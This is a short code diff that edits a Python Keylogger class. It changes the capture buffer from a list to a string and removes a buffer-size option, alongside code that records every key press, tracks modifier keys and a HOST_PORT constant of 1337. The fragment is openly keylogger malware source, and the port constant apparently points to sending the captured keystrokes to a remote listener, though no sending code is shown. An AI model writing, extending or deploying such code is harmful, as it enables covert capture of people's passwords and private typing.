@@ -12,9 +12,8 @@ HOST_PORT = 1337
 
 
 class Keylogger:
-    def __init__(self, buffer_size: int = -1):
-        self._buffer = []
-        self._buffer_size = buffer_size
+    def __init__(self):
+        self._buffer = ""
         self._ctrl_state = False
         self._alt_state = False
         self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}
@@ -37,7 +36,7 @@ class Keylogger:
             pressed = self._key_map.get(
                 key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
             ).upper()
-        self._buffer.append(pressed)
+        self._buffer += pressed
 
     def _on_release(self, key) -> None:
         if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
